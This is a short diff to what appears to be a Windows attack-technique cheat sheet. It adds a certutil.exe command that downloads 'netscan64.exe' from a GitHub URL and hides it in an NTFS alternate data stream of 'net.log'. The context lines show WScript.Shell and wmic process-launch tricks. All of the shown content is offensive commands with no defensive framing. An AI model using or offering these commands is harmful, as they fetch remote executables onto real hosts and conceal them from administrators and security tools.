@@ -112,6 +112,10 @@ $Microsoft = echo 'var Windows = new ActiveXObject("WScript.Shell");Windows.Run(
 
 ----------------------------------------------------------------------------------------------------------------------------------------
 
+certutil.exe -urlcache -split -f https://raw.githubusercontent.com/analyticsearch/commercial/master/netscan64.exe C:\Users\Public\net.log:netscan.exe
+
+----------------------------------------------------------------------------------------------------------------------------------------
+
 wmic process call create calc
 wmic path win32_process call create calc
 
